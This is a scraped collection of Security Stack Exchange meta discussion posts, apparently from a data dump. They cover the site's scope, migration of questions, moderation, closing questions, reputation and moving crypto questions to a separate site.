TBH part of what tipped the scaled for me (towards undecided, and away from closing outright), was the excellent answers already received there, before I viewed the post. Closing it outright would be unfair to those fantastic posts (though, as @D.W. commented there, the question itself is unfair to the posters).  </p>

<p>Btw, there was quite some discussion on this very issue, over at the <a href=""http://chat.stackexchange.com/rooms/151/the-dmz"">DMZ (IT Security Chatroom)</a>. That is one way to gather consensus, and understand via discussion the different issues at hand.<br>

"Regarding Our Scope: What's Acceptable, What's Not","<p><sub> This is not a list item, by design, because I think the site definition should be inclusive rather than defined by a list. </sub></p>

<p>I think this site should expand to cover <strong>all questions germane to security professionals</strong>. This includes IT systems, software applications, building , locksmithing, accounting procedures, and any similar topic, as long as the question is intrinsically about security. “Professionals” means that this is a place primarily intended for people whose job is about security; nothing prevents amateurs from posting, but the onus is on them to rise to the professionals' level.</p>

<p>In other words, I am pushing to change the first sentence in the <a href=""https://security.stackexchange.com/faq#questions"">FAQ</a> to</p>

<blockquote>
  <p>Security - Stack Exchange is for security professionals to discuss protecting assets from threats and vulnerabilities.</p>
</blockquote>

<p>Or, to put it in a different way: <em>if it's good enough for <a href=""http://www.schneier.com/"" rel=""nofollow noreferrer"">Bruce Schneier</a>, it's good enough for <a href=""https://security.stackexchange.com/"">Security Stack Exchange</a></em>. (I'm willing to compromise on squids.)</p>

<hr>

<p>There have been precedents, of broadening the scope of a Stack Exchange site during the beta period. <a href=""https://scifi.stackexchange.com/"">Science fiction</a> broadened to Science fiction and Fantasy after about a month in beta, with general agreement (more details upon request). <a href=""http://audio.stackexchange.com/"" rel=""nofollow noreferrer"">Audio Recording and Production</a> broadened to Audio-Video Production (I don't know the details). Changing now, after launch, is a bit late, but not impossible. I'm not concerned so much with the existing IT security community, but with physical security and other communities who might have a difficult start on an existing site. This is a surmountable difficulty, in my mind a much lesser evil than not having direct contact between IT security and other security fields.</p>

"Regarding Our Scope: What's Acceptable, What's Not","<p>Information Technology Security is the documenting of requirements, design, implementation, integration, test, certification, deployment, accreditation, operation, maintenance, repair, and retirement of the security for an Information Technology system.</p>

<p>Methods and techniques exist to make information available or unavailable. These techniques modify how information is stored, retrieved, displayed, and transmitted.

Negative availability of information is the ability to prevent unauthorized subjects from gaining access to information even when exposed and under threat.</p>

<p>Integrity of Information</p>

<p>Methods and techniques exist to check the integrity of information. These techniques augment the information with data describing the information at a given point in time.

"Regarding Our Scope: What's Acceptable, What's Not","<p>This proposition has reach is critical mass with regard to the ""IT Security"" scope. All the site is now branded over this specific topic, design as well as some other support (I don't know if they already planned T-Shirt, business-cards, etc). 
This makes me worry on two things about the scope broadening.</p>

<ol>
<li><p>We shall change our identity, from ""IT Security"" to ""Security""</p>

<ul>
<li>Does this mean we shall drop all the work done? Design, communications, ...</li>
<li>What does change of identity means for us right now? I mean we had one year of beta and we did not include physical security. Why now? Does it mean we did not work our scope well enough? That may impact the image of the site badly. Take care!</li>
</ul></li>
<li><p>How will the community react to it.</p>

<ul>
<li>People here may not be ready to support an expanded scope such as what @Gilles is porposing. We do not want question to be left unanswered because of lack of expertise. Unfortunately I understand that beta(s) on physical security already failed. That is also a major issue in scope broadening with regard to the current statement.</li>
<li>Would this scare existing users? We can't possibly begin to push ""beta-like"" question right in the question list of [security.se]. We need to separate the ""beta"" process, from the already launched site.</li>
</ul></li>
</ol>

<p>With this in mind, it triggers an idea. But it may be a bit early to do that because we have to take care of ourselves in this first year of independence. Though, would it be possible to babysit a proposition within our garden? I mean some thing that would be like a three way StackExchange site: InfoSec / Sec / Meta. It may require a bit of work from devs I guess, but we may enrich the Area51 staging place with a new system. This would be a way to push smaller proposition, that did not fit [all] the beta critters, into existing sites, with merging objective. In this context, requirements for visit/day, high-rep user ratio or question per-day ratio can be ignored or reduced, because of the mother-site influence.
Reputation would be shared across mother-site and baby-site, giving it the power of the community management from ITSec and reward new-comers with reputation for ITSec when participating in the baby-site.</p>

<p>At the end, if the experience is successful enough, merging - rescoping - renaming etc would be possible. In case of failure, people from the baby site would just be part of the main site, and the proposition dropped.</p>

"Regarding Our Scope: What's Acceptable, What's Not","<p>The site already covers the topics you ask about since they are all related to IT security.  In particular it covers many aspects of physical security.  Covering physical security is critical to IT security - how do you protect servers, laptops, disks, remote backups, transit etc without physical control over them?  How do you get physical control without good knowledge of locks, id procedures, etc?  And has been discussed before, all this holds together because the same ""cat-and-mouse"" mindset is critical to these various security questions.</p>

<p>During the IT Security beta period, we had meta discussion of <a href=""https://security.meta.stackexchange.com/questions/311/what-about-physical-security"">What about Physical Security? - IT Security Meta - Stack Exchange</a>, and the high-voted, selected answer was to be inclusive.  Physical questions were happily asked, tagged and answered during beta.</p>

<p>The aspects which this site presumably doesn't cover (e.g. political rants about the TSA, personal questions about martial arts training and weapons, etc.) are generally not covered because of our focus on being professional and rooted in IT matters, not because we don't do physical security.</p>

Downsides of migrating questions from high-volume sites,"<p>One possibility would be, when a question is migrated, to zero out the vote counts on all associated answers.  In other words, the public vote counts would only aggregate votes cast after the migration, by users of IT Security.</p>

<p>However, this seems like a pretty substantial change, and it could easily have unanticipated unintended side effects, so I don't know if it would be desirable.</p>
",<discussion>,16,,300
Downsides of migrating questions from high-volume sites,"<p>The general guidance is to migrate early if a question is offtopic. Generally, once answers have built up migration is discouraged - partly due to the issue you have mentioned, but also as it causes disruption with users on the other site losing rep etc. There are a few meta.so questions on this topic.</p>

<p>In general we do tend to see them come over without too many answers (ideally zero) but I think there will always be the odd one that gets answers and votes before being flagged and migrated here - I wonder how big a problem it is in real terms. </p>

<p>From an SEI perspective, you do want people to come here to find the 'right' answer and they tend to believe the votes, so there should be mileage in adjusting where the votes tally is not from specialists in the field.</p>

<p>An option is to <strong>delete the answer</strong> - which could be fine if it is entirely wrong, but probably not ideal ifthe answer has good points in amongst the bad.</p>

<p>Another is to <strong>edit the answer to make it right</strong> - this should be encouraged. I don't think we do it enough here on sec.se.</p>

<p>There was a recent example of this - <a href=""https://security.stackexchange.com/q/5539/33"">Is it OK to tell your password to an admin?</a> - it was migrated over from SuperUser (the smallest of the trilogy sites) after 3 hours, and it already had 3 answers with <em>dozens</em> of votes, even though they were <em>very</em> wrong.    </p>

<p>Because of the problem you present, and the apparent incapability of our community to compensate for the incoming wrongvotes, I took the extreme action of closing the original question, and having the OP re-ask the question here.   </p>

<p>That said, I've come to realize that the above solution is kinda pointless.   </p>

<p>It's simple for a popular question - such as the recent XKCD hoopla - to draw in large numbers of non-security folk, who could swamp the results by crowdvoting the wrong answer, even though it originated here together with correct answers.<br>
Case in point, the highest-voted answer on the XKCD question...    </p>

<p>My point is that it goes back to the validity of the SEI model of crowdsourcing, as we've discussed since back in the early days of the beta - there is simply no guarantee that the highest voted - or accepted - answers are correct.<br>

<p>Well, first off... Users can't actually delete accepted answers. Once an answer is ""accepted"" (the asker puts that green check-mark to the left of it) only a moderator can delete it. </p>

<p>Aside from that, <em>rarely</em> is any post truly deleted. Hidden away, where only moderators and users with more than 10K reputation points is the real meaning of the word. If necessary, they can be restored.</p>

<p>Beyond that, there are periodic data dumps made publicly available, so it's often possible to retrieve deleted content from those even if you're unable to view it on the site. </p>

<p>In the <strong>nomination</strong> phase, any community member in good standing with more than <strong>300</strong> reputation may nominate themselves to be a community moderator.</p>
<p>Nominees are required to construct a small, freely editable introduction to describe why they might make a good community moderator.

On Usenet in the security groups new users often get extremely unfriendly replies that are not related to the topic at all. There are very little of these insults here.

I am one of the core developers and game-master/admin of the open source game Stendhal. The community and especially the trouble makers look for every mistake of an GM. But that is okay, it's to be expected that moderators set a good example. Yes, mistakes do happen. Admitting them openly and getting the community involved is a good approach. Moderators are not alone. Difficult situations can and should be discussed.</p>

This is evidently a serious thing, that is bringing a little fear of wrong doing. But anyway, this shall not change the basis of my behaviour. I'll still answer question to provide guidance as usual, or comment. Of course, users know well how to complain on meta (I can find dozen of example on MSO). So yes this may give us more weight in discussion and as it not been taken too lightly, but it should not make us reluctant to act.</p>

If, after a discussion, and a warning or two, then temporary bans seem to be the most reasonable next step. This is definitely a hard situation to deal with, though.</p>

At the end of the day, this is, after all, about communities, not individuals.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/b379cfe07bbf58aab9414128a6e159f8?s=16&amp;d=identicon&amp;r=PG"" alt=""M&#39;vy""> <a href=""http://chat.stackexchange.com/users/13100/mvy"">M'vy</a> <a href=""http://chat.stackexchange.com/transcript/message/1994935#1994935"">answered</a>:</strong> Well. Tough question indeed. But I think that the best thing is to inform the user about it. Chat, message are here for this. In the last resort, I suggest to discuss it with the other mods and/or with the community to find the best answer to it. We do not want to judge to quickly.</p>

Valid flags and good answers seem contradictory. I take it that this would be a case where follow-up comments were hostile / attacking... and you just very slowly ramp up the pressure... add comments that redirect, then address the user through regular channels, then admin, then increasing temp bans.... others have accurately pointed out that you need to let them know they are valuable, but they must also be civil.</p>

I really like AviD's approach. He did edit the comment to remove the offensive part while keeping the valuable part. In the end the friendly community is more important than an trouble maker even if he posts good answers. But we should try to help this person to settle in before temporary suspending an account.</p>

If the flagged comments really detract from the site, then there needs to be more intervention than if it is a case of admirable passion about an issue that happens to trigger some other folks who are overly prone to flag things.   Trying to reduce tensions and clarify this in private and if necessary in public is one step, but it all depends....</p>

If you get somebody like @ThomasPornin being the one who points out that it's technically wrong and you know by reputation that he is the somebody who is a master of their domain, you point that out. If it's civil, this isn't a moderator role -- it's a user role. The mods on SO aren't running around fixing technical comments on code.</p>

If the answer has at least some information which is correct, there is nothing to do, and the poster earned the reputation. However topic that shall be off-topic, or not suited to the site shall be removed. By the way, we can pinpoint the user that think answer are wrong to propose a new one or improve the existing.</p>

I see a moderator's role being that of responding to incidents and guiding the culture. In this situation, I do see it as, largely, a normal user issue to deal with. The problem, however, comes into play when you're dealing with a dangerously incorrect answer.</p>

There may be cases which justify moderator involvement, but those have to be looked at on a case by case basis.</p>

I wouldn't want to use my mod powers to obliterate or change the answer in case it's me that's in the wrong. I'd down vote, leaving a comment with references to explain why. I might bring it up in chat to see what everyone else thinks.</p>

I think the best approach to deal with this is to encourage discussion (for example invite to chat) and admit mistakes. Trying to be open about ones motivations and accepting disagreement by the community to overrule ones decisions.</p>

But I'm not forcing it, as the community is half in favour, half against, so far:-) Plus, Lockpicking is cool!</p>

<p><strong><img src=""https://www.gravatar.com/avatar/34e5e0b41202f3c375552750c0d6f309?s=16&amp;d=identicon&amp;r=PG"" alt=""Jeff Ferland""> <a href=""http://chat.stackexchange.com/users/9882/jeff-ferland"">Jeff Ferland</a> <a href=""http://chat.stackexchange.com/transcript/message/1995788#1995788"">answered</a>:</strong> I think physical security is part of the realm of IT security. I think we would have no influence on people who implement airport security, so we can skip that. More than anything, I think if the community is overwhelmingly in favor of something, that's the way we go and as stewards who represent, the moderators shall make it so.</p>

As part of my Information Security Analyst duties, I deal with physical access controls frequently. Lockpicking is actually an On-Topic job for me. Pentesting, for example, isn't just about hacking code, but also about slipping in through the back door (so to speak).</p>

Changing the scope is not an easy thing and shall be dealt with care. Area51 is here to hatch ideas and if beta there fails, but had interesting points it may be worth welcoming thenew community. As for example, we now have a facebook site buillt over SO, and I think this can have offsrping somewhere.</p>

StackOverflow combines many different programming languages which would easy provide enough content for independent sites, but it has one target group so it works very good.</p>

We've got a nicely focussed community, that people who need guidance on IT security issues can turn to.

"What is ""accept rate""?","<p>When you ask a question and have various answers, it is generally considered good form to accept the answer which most helps you. You do this by clicking on the tick next to that question.</p>

<p>It doesn't have to be the one with the most votes, but often the votes will give an indication as to the value of the answer. It also doesn't need to be accepted straight away - for some questions you want to leave it open to get more answers, but once answers stop coming you should accept the one you feel best answers your question.</p>

<p>If you have a low accept rate, people may not bother to answer (because the best rep earning for a single activity comes from accepted answers) so in order to encourage people to answer your question you should regularly look at your questions and accept the answer that you think best from each one. </p>

<p>Just to clarify</p>

<ul>
<li>an upvote gives 10 StackExchange reputation points</li>
<li>an accept gives 15 StackExchange reputation points.</li>
</ul>

<p>Usually good answers are voted up several times. For example, if a answer is upvoted 5 times and accepted the author gets 50 StackExchange reputation points from upvotes and 15 StackExchange reputation points from accept for 65 points total. 15/65 is 23% which is significant. However, if an author has a lot of accepted answers for a particular tag the author's reputation (not StackExchange reputation points) as an authority on that tag is increased in a non-numeric way.  </p>

"Why is ""What is the best password storage scheme for end users to store high entropy, unique passwords which is failure resistant"" locked?","<p>Have a look at the posts <a href=""https://security.stackexchange.com/posts/8661/revisions"">revisions</a>. What you can see here is an edit war - the OP clearly took exception to the community response (i.e. downvotes, various comments calling into question the scope of the question) and added a rather large section to the post to let off steam.</p>

<p>This was removed by community members and the OP repeatedly rolled back the post to include said content. To prevent this, Shog9 locked the post, which prevents anyone but a diamond (a site moderator or stack exchange employee ""carrying"" a diamond - not all do) doing anything meaningful to the question at all, including vote, edit, close, delete, undelete, answer etc. </p>

<p>Since users have most of these permissions on their own posts, locking is a last resort option which prevents even the OP from altering their own content. Stack Exchange content is contributed CC-by-SA, but once contributed you cannot revoke that license to your content and vandalising it or altering it in a way that is not constructive in the community needs to be prevented. That is what has happened here.</p>

<p>The idea is to force such discussion to resolve itself on meta whilst not allowing the post to suffer in the dispute. The OP is, therefore, welcome to wander over here and ask why their question was locked and hopefully achieve community consensus on what should be done. Clearly that discussion hasn't started yet; in this case, I think it would require the OP (or another person?) to ask why his question was, in the eyes of some, considered too broad.</p>

<p>As to why Shog9 stepped in - I don't know. Perhaps he saw the issue first? Perhaps he was checking up on our moderators/this community in general (that is his job, after all) and just saw a flag? Who knows; I don't. There is, however, nothing wrong with what he has done. He hasn't taken any action our moderators cannot undo; he has, however, prevented a problem from escalating. Shog9 has a lot of experience with this sort of stuff; he was <a href=""http://blog.stackoverflow.com/2011/03/welcome-valued-associate-josh-heyer/"">hired</a> precisely because of his contributions to SE and experienced a time before tools such as locking existed. I don't see a problem with SE staff helping out where their speedy action stops a problem dead in its tracks and encourages a community consensus, rather than the abuse of a post, or what you might see elsewhere as a derailed thread. Moderators are not all-present users and whilst there are three of them, it can happen that all three moderators are away for a time, particularly at weekends. </p>

Shog9 happened to notice the flag, approved my edit to remove the insults, and locked the post pending further resolution.

Is it appropriate to ask about end-user website security?,"<p>This is a tough question to judge from a provider's viewpoint.

<p>If we can help common Facebook users instead of just privacy savvy Facebook users we have the potential to help many people. </p>

Complaint: Too hard to change my vote on an answer,"<p>It <em>seems</em> that at an early point in the history of StackOverflow, they got bitten by several wide-scale ""gaming"" attempts which involved downvoting and then subsequent undoing of said downvotes. The SO people are not very eager to give details... My guess is the following: <em>within the database structure</em>, there is no tracking for undos: an undone vote is as if the vote had never occurred. However, the SO people react to gaming attacks by running fraud-detection scripts, which look for ""suspicious patterns"". What these scripts do is not public information, because it would presumably make it too easy to fl under the radar (that's security through obscurity at its finest). So they deactivated vote-undoing (beyond the 5-minute window) because they need modification history to do their magic detection thing, and undoing erases history except when it is part of an edit (and I am quite ready to believe that retrofitting vote-undoing-tracking to their system could be a daunting task).</p>

<p>To sum up, I think that the impossibility to undo votes is here to stay, because removing it would prevent some fraud-detection scripts to work, or would imply adding some non-trivial features into the SO engine. <em>And</em> you will probably never get such a straight answer (or even a comprehensive description of what really is ""tactical downvoting"") from the SO team (except the generic ""it is for security"") because of the perceived need for obscurity.</p>

<p>Designing a voting system which is resilient to tactical downvoting and yet does not rely on obscurity looks like an interesting question. It is part game theory, part psychology, and it would be on-topic on security.SE.</p>

When is it appropriate to migrate a question from another site?,"<p><strong>My view.</strong> My suggested criteria for migration is that the question is on-topic here, and will get better responses here, and has not already received a non-negligible number of answers or votes.</p>

<p>I'd urge moderators to avoid migrating questions after they've already started to receive a non-trivial number of answers, comments, and votes, as that leads to a situation where pre-migration votes from the original site overwhelm the number of votes that are likely to be cast by our community.  If it is going to be listed on our site, I think we need to have ownership and control over the answers.  Migrating a question after it has already received more than a few votes from the original site prevents us from taking on that kind of control and ownership.  See, e.g., <a href=""https://security.meta.stackexchange.com/q/494/971"">a list of bad migrations I compiled earlier</a>.</p>

<p>If a question already has multiple answers, or has answers with more than a handful of votes, then I would suggest that it not be migrated.  It should either be left on the original site, or the original question should be closed and a new question should be created on our site.</p>

<p>That's the position I'd advocate for.  But I'd like to hear the view of the rest of the community, and of the moderators, too.</p>

<p><strong>The reason I'm bringing this up.</strong>  We had <a href=""https://security.stackexchange.com/q/9286/971"">another dubious migration today</a>.  The migrated question comes here with two answers that already have 26 and 12 votes.  We don't have enough voting members on this site to come anywhere near that; very few questions on this site get anywhere near that many votes from members of our own community.  Thus, at this point, it is a given that votes from the original site are going to overwhelm votes from the IT Security community, for that question.  I don't like having a question and answers listed on the IT Security site, when the votes are overwhelmingly from some other site and when the IT Security community effectively does not have ability to perform quality control of the answers.</p>

When is it appropriate to migrate a question from another site?,"<p>Questions are migrated to another site; not from another site. We do not have any control over the migration process for questions we get. In the inverse case, when we want a question, we can ask a moderator on the other site to migrate it to us.</p>

<p>In this case we could declare it off topic, since it is clearly not a question for professionals. We could move it on to superuser, but I doubt that is helpful.</p>

<p>The answer with the most votes, actually seems like a good approach to me: (Only allow kids supervised access to the computer and enforce time restrictions in a non technical way because the kids are likely to be way more experienced than the parents).</p>

<p>The only things I can think of that might be out of IT Security's realm here, would be some particular ""how do I use"" or other ""application troubleshooting"" questions which more appropriately belong on SU/SF.

Why is this closed question not being deleted?,"<p>I don't know enough about security to know exactly how that question fits or does not fit.

<hr>

<p>With the exception of duplicates (which we keep around for searchability), <strong>closing is intended to be a temporary state for a question</strong>. There are only two states in the future of a closed question - getting deleted or getting reopened. The primary purpose of closing is to serve as a sentence to eventual deletion. However, it is not the end of the world, as the closure may be identified as erroneous or the question may be fixed up, resulting in its reopening. </p>

<p>The end takeaway here is that <strong>unless a question has some chance to be considered for reopening, it should be deleted</strong>. Sometimes a question is borderline, or is the subject of an extended discussio of the site's scope. This is about the only time that a question should remain closed for extended periods of time. If the question is definitively out of the site's scope, and there is no business to be had even spending any time arguing to reopen the question, then it is better off to delete the question. Otherwise, you are leaving an avenue to reopen elements that you do not believe should ever be reopened.</p>

<hr>

<p>It is often spoken of that a closed off-topic question could be left on the site ""as an example of what doesn't belong"". This sounds great on paper, but in practice it doesn't work out. Recall the earlier point about duplicates - closed questions are still entrances to the site. Keeping junk you do not want means that people who are looking for said junk will end up finding your site. Most of the time, you do not want that.</p>

<p>The other salvaging point one might look at is the answers on the question. An excellent answer may protect a pretty horrible question, that's after all why we have the Reversal badge. However, ask yourself when looking at a closed question with a great answer, ""does the answer salvage the question to the point it <em>shouldn't</em> be closed?"" It is unfortunate that a great answer may be lost due to being in the wrong place, but you shouldn't spare the world's greatest turkey recipe just because someone asked how to keep his dinner safe from ravenous relatives. Your business as a site is to host information related to the scope you set - the great and wonderful content on your site should reflect your scope and not what is outside of it.</p>

FAQ — A guide to moderation: Voting to close a question,"<h3>Rationale: why do we close questions?</h3>

<p>There are really two ways to do moderation. If you've been on any of the <code>.moderated</code> newsgroups you'll be well aware that to get a post on there, it needs to undergo a review process first and be accepted. The aim is to keep problem discussions from arising.</p>

<p>SE is slightly different - it works the other  way. <em>Anyone</em> can ask a question on SE and closing a question is the equivalent of putting that question <em>back into review/improve mode</em>. It's a feedback mechanism designed to react to problem cases only, so the usual business of asking and answering good questions can just... <em>happen</em>.</p>

<h3>Why do we close a question?</h3>

<p>The philosophy of SE is that each site handles questions on <em>problems you face</em> or things you are trying to understand. The <a href=""https://security.stackexchange.com/help/dont-ask"">don't ask</a> section of the help center gives you a good overview of things that don't work - to summarise:</p>

<ul>
<li>Some questions invite arguments or extended debate that suck up time when members could be helping other people.</li>
<li>Some questions are too broad, too narrow or have other content problems.</li>
<li>Some questions belong elsewhere.</li>
</ul>

<p>These have been worked out over time and with a lot of experience from Stack Overflow and are, <em>broadly speaking</em> true. Sometimes, exceptions are made - it is always a case-by-case thing.</p>

<h3>Is closing like deletion?</h3>

<p>No. Actually, deletion is a different concept on SE. Closed questions are put ""into improve mode"" if you like, and are still visible for <em>anyone</em> to improve. That's the idea. Deleted questions are different — they have a red background and are invisible to all but high reputation users. So deletion is different and solves a slightly different problem.</p>

<h3>What are the requirements for closing a question?</h3>

<p>If you have 3000 reputation, or 500 reputation on a beta site, you can vote to close any question for the reasons above. More on that in a moment.</p>

<p>If you do not have this level of reputation, you will find that under the flag menu, you have an option ""this question does not belong here"". That will raise a flag for users who can vote to close.</p>

<h3>Why can anyone vote to close/reopen?</h3>

<p>Firstly, anyone with sufficient reputation can vote to close or reopen (or flag as such, with lower reputation) because it is <em>your site</em>. This is really important - it's about expressing what you feel works and doesn't.</p>

<h3>Ok, so how does it work?</h3>

<p><img src=""https://i.stack.imgur.com/qogGL.png"" alt=""Example close button""></p>

<p>Ok, the important piece. Voting to close works like this:</p>

<ul>
<li>Underneath the question, there will be a close link. When you click on this, you will be presented with a list of options from which you can pick a close reason most appropriate to the situation.</li>
</ul>

<p><img src=""https://i.stack.imgur.com/THms0.png"" alt=""Close vote reasons dialog""></p>

<ul>
<li>If other people have voted, you will see blue numbers against the reason they chose.</li>
</ul>

<p><img src=""https://i.stack.imgur.com/69Kak.png"" alt=""Other votes""></p>

<ul>
<li>The exact duplicate page takes you to a page that allows you to specify a question to close as an exact duplicate against.</li>
<li>The ""off topic"" page will present you with two options - one to migrate here, to meta, and one just off topic. At the moment, only moderators can send questions elsewhere, so feel free to cast a vote here and flag if you have a target in mind - we are collecting statistics to build a ""migrate to"" list, but that is not implemented yet.</li>
<li>The other options are straight out closes.</li>
<li>Once you pick your option and click ""close"", your vote is registered. You cannot retract it at this stage, but nobody else, including moderators, will know it was you who voted.</li>
<li>If five people agree, the question will be closed. You've seen the effect of these before.</li>
<li>Your name, and the name of other closers, will appear on the bottom of the question.</li>
</ul>

<p><img src=""https://i.stack.imgur.com/K3F4V.png"" alt=""Close banner""></p>

<h3>How does vote to re-open work?</h3>

<p>A closed question has a ""reopen"" link underneath it. If you click this, a dialog box will ask you if you are sure - click yes and your vote will be registered to re-open the question.</p>

<p>Below, you can see an example of the re-open link with two votes registered for re-opening (out of five).</p>

<p><img src=""https://i.stack.imgur.com/syw4O.png"" alt=""Re-open link""></p>

<h3>What happens if I make a mistake?</h3>

<p>Don't worry! You can retract your close vote by clicking the “close” button again. This is useful, for example, if the question has been edited since you voted to close. Note that you cannot use this to change the close reason (if you retract a close vote, you can't cast a new one).</p>

<p>Furthermore, unless five people agree, or a moderator agrees, the question won't be closed. </p>

<h3>Why are some questions closed with fewer votes?</h3>

<p>Moderator close votes complete the required vote count immediately, no matter how many people have voted. This applies for both close/reopen votes.</p>

<p>Furthermore, closure as duplicate can be faster for two reasons. If the asker agrees that their question is a duplicate, they can validate the closure immediately. This shows a final duplicate close vote from “Community”. Also, if a user with a gold tag badge in one of the question's initial tags votes to close or reopen as a duplicate, this takes effect immediately; in this case a gold tag badge icon appears after the closer's name.</p>

<h3>I've seen a closed question and I disagree. What can I do?</h3>

<p>Well, one option is to use your re-open vote! You can also always raise a discussion here on meta to seek clarification on why a question is closed and hopefully either a resolution will be reached, or you will get an explanation for the closure. </p>

<h3>My name appears on the bottom. Isn't this going to cause problems with other users?</h3>

<p>Actually, surprisingly few closed questions generate any response at all.</p>

<p>However, if you experience difficulties as a result of closing a question, you can and should contact a moderator via the flag mechanism (which is anonymous). We can then take any necessary action.</p>

<h3>How do I find questions I might need to close? What about re-opens?</h3>

<p>In the <a href=""https://security.stackexchange.com/review"">review queues</a>, specifically the <a href=""https://security.stackexchange.com/review/close"">close votes queue</a> and the <a href=""https://security.stackexchange.com/review/reopen"">reopen votes queue</a>. These queues are open to everyone who has the close vote privilege. For each question, you get to decide whether to close/reopen or not; enough “no” votes take the question out of the queue. An edit from the queue is a vote to not close or reopen.</p>

<p>Usually we do get to discuss before questions are migrated over. Sometimes not, but that is fine in most cases. We can always close, merge, delete if necessary. The only problem is when there are higher votes than those we can generate here, and as @Iszi mentioned in the comment above, there is an ongoing request for vote reset on migration, but we have no update as yet.</p>

Reputation gets reduced for inactivity?,"<p>If you have a look at questions like <a href=""https://meta.stackexchange.com/questions/2251/will-we-get-back-rep-points-lost-after-a-rep-recalc"">this one over on meta stackoverflow</a> you will see that Stack Exchange recently updated the way they work rep calculations, and this has had an impact on some people. </p>

<p>As I understand it, you will lose your 1k privileges, as you have dropped under the 1k mark, but this privilege amounts to <strong>Show total up and down vote counts</strong>, and in any case, you are one upvote away from getting it back so I wouldn't worry.</p>

<p>The main impact is on rep from a long time ago, any more recent changes are actually just around when the rep is measured - it is now real time, as opposed to batch calculated.</p>

Crypto questions that can be migrated to crypto.stackexchange,"<p>I dont think that any question tagged with crypto should automatically be migrated to the crypto site. Certainly not <em>all</em> the new crypto questions are being migrated, and there are definitely some existing ones that shouldnt be.    </p>

<p>I see the difference as questions <em>about</em> crypto, how to use it, what to use, key management, what security trade-offs there are, etc - are more ontopic here than on crypto.se.<br>
On the other hand, questions that are <em>inside</em> the cryptographic algorithms, internals, etc are the ones that should be migrated. </p>

<p>In other words, the theoretical, ""math-y"" parts of crypto should be there, the engineering parts here. (No, I'm not saying that all of crypto is ""just"" theoretical.)   </p>

<p>While there is definitely some gray area, it seems that <em>most</em> questions are clearly either here or there.<br>
I think the simple guideline is: If it's a question for a cryptographer / cryptologist / academician, it's a crypto.se question. If it's a question for a security engineer / architect / auditor / consultant, its a sec.se question. </p>

Crypto questions that can be migrated to crypto.stackexchange,"<p>Well, I'm a crypto mod and here's my take, bearing in mind I have an interest in promoting crypto:</p>

<p>Don't migrate old questions.</p>

<p>Really. There's no point in moving questions around just because right now they fit the scope of one site or another better. They were on topic here at the time, the OP has either had a resolution to their question or not checked back to see the outcome; either way, we're all done with those questions and unless there is a major reason to dig them up and improve them, we can leave them around for others to read at their leisure.</p>

<p>On a purely practical note, retagging 400 questions is not my idea of a fun weekend. Whilst I think the influx of questions would make crypto look good, it'd be a huge cleanup operation.</p>

<p>One of the things I took out of the recent firestorm on Stack Overflow r.e. closing and moving old questions was that actually we should judge a question on the answers it has - not purely on the question. The <a href=""http://blog.stackoverflow.com/2012/03/se-podcast-32-jarrod-dixon-and-josh-heyer/"">podcast</a> for SE discusses this idea in unlimited amounts of detail.</p>

<p>The same applies to crypto vs security for a crypto question. It isn't about defining an ontology and moving crypto questions to crypto.se - it's about the answers you'll get:</p>

<ul>
<li>On Security.SE you're expecting a best-practices security-focused what-should-I-do-to-be-safe answer. If you ask about inventing your own crypto, you'll politely be told not to do that and instead directed to one of the many freely available crypto libraries, recommended reading, previous questions etc.</li>
<li>If you ask on crypto, you'll get a detailed explanation of the various pitfalls of your scheme, with reference to relevant results.</li>
</ul>

<p>Another practical problem of migrating all these questions is that many of them have answers in the former category, not the latter.</p>

<p>Finally, if there's a crypto question here on security that is harmful to the internet in its content, that can easily be fixed by existing mechanisms we have for that kind of thing - in increasing order of severity comments, downvotes, closing, deletion, whichever applies (the idea being we'd hopefully educate the poster along the way so that they fix the issue, whatever it is :)).</p>

Crypto questions that can be migrated to crypto.stackexchange,"<p>I am a fan of ""compendium of knowledge"" and see value in moving high value/point questions to the appropriate site.  I also see your point on how it can be confusing.  There is overlap, and there isn't a hard and fast rule.</p>

<p>On the other hand, questions with false, misleading information should be closed on the appropriate site with a link to the most relevant answer on the correct site.  This will prevent a site like Stackoverflow from overwhelming a smaller niche site such as cryptography.  An uninformed reader may follow the advice of the highest voted question, and do things the wrong way.  That is a loss for them and a loss for the SE community.</p>

<p>Finally, I think that questions with low votes, low views should be migrated according to user demand. Any time a question is touched (edits, rewrites, or especially mod flag) then they should be re-tagged accordingly.  The retagging process is a pain, so perhaps the flagger should include new proposed tags as well.</p>

<p>This is my perspective so far:</p>

<ul>
<li>SO - for programming, language specific implementations</li>
<li>Sec.SE - for all engineering, network, security admin and corporate policy questions </li>
<li>Crypto - for issues dealing with crypto mechanics or implementation variances in various libraries/etc.  Some Math questions here</li>
<li>Math.SE - for deeper math questions that are more theoretical than Crypto's scope </li>

Has the IT Security S.E. evolved into a S.E. for information security?,"<p>Absolutely.   </p>

<p>While I agree that Privacy is not equivalent with Security (and please, ignore the ""IT"" part of it, that was locked in at the beginning, and really only intends to convey the ""professional"" aspect), you should realize that one of the responsibilities of Security, is protecting that Privacy.<br>
As @Gilles has commented on the proposal several times, Privacy is really about protecting the confidentiality (security) of certain personal information. While I would say that Privacy does go a bit further than that, it is still the core.   </p>

<p>I also want to point out that in common SDL (Security Development Lifecycle) frameworks, there are quite a bit of Privacy requirements. In Microsoft's SDL, almost half (!) is privacy oriented - most Security chapters have a parallel Privacy chapter. Two sides of the same coin.   </p>

<p>In any event, of the 8 proposed questions on the proposal so far, almost all would be clearly ontopic here. The only hesitation I would have is the purely legal ones, that <em>could kinda</em> be ontopic here, but could not be safely answered without the big honkin' IANAL disclaimer.<br>
But that would be that case with a standalone Privacy proposal, too.   </p>

Has the IT Security S.E. evolved into a S.E. for information security?,"<p>We ended up having this conversation, primarily in the chat room, during the time that the site graduated from beta. Unfortunately, this was a bit too late since all of the branding and design had been finished, all of which included the dreaded 'T'. </p>

<p>While many of us (most?) on the site came out of an IT background, the industry as a whole has shifted more towards focusing on the information and less on the storage media.

Your question about Privacy fits in with the Confidentiality aspect. Let's not forget that a privacy is a central function to many legislative and industry compliances that we are in the business of handling. Just to name a few we have FERPA, HIPAA, and PCI-DSS (the size and makeup of this list varies widely depending on <em>your</em> industry), but all 3 of those have Confidentiality (privacy) components.</p>

Why does security.stackexchange.com not encrypt logins?,"<p>This has been fixed. it was caused by the wide width of the <code>pre</code> code block.</p>
",<discussion><ssl>,3,,287
Why does security.stackexchange.com not encrypt logins?,"<p>I think it does use SSL for login the process. It's using openID which itself is using SSL if I'm not mistaking.</p>
",<discussion><ssl>,3,,287
